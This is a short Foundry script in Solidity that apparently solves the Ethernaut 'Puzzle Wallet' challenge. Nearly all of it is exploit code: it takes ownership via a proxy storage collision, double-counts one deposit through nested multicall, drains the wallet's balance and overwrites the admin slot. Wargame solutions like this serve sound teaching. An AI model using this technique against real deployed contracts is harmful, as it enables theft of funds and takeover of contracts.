// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {PuzzleWallet, PuzzleProxy} from "../src/PuzzleWallet.sol";
import {Script, console} from "forge-std/Script.sol";

contract PuzzleWalletSolution is Script {
    PuzzleWallet puzzleWallet = PuzzleWallet(0x9a15141d1e60b9D9B7365b3a25D2A14f64B346C1);
    PuzzleProxy puzzleProxy = PuzzleProxy(payable(address(0x9a15141d1e60b9D9B7365b3a25D2A14f64B346C1)));
    address myAddress = vm.envAddress("MY_ADDRESS");
    uint256 myBalance = puzzleWallet.balances(myAddress);
    address checkOwner = puzzleWallet.owner();

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        puzzleProxy.proposeNewAdmin(myAddress);
        puzzleWallet.addToWhitelist(myAddress);
        uint256 myAddressConverted = uint256(uint160(myAddress));
        bytes[] memory depositData = new bytes[](1);
        depositData[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);
        bytes[] memory data = new bytes[](2);

        data[0] = depositData[0];
        data[1] = abi.encodeWithSelector(puzzleWallet.multicall.selector, depositData);
        puzzleWallet.multicall{value: 0.001 ether}(data);

        puzzleWallet.execute(myAddress, 0.002 ether, "");
        puzzleWallet.setMaxBalance(myAddressConverted);
        vm.stopBroadcast();
    }
}
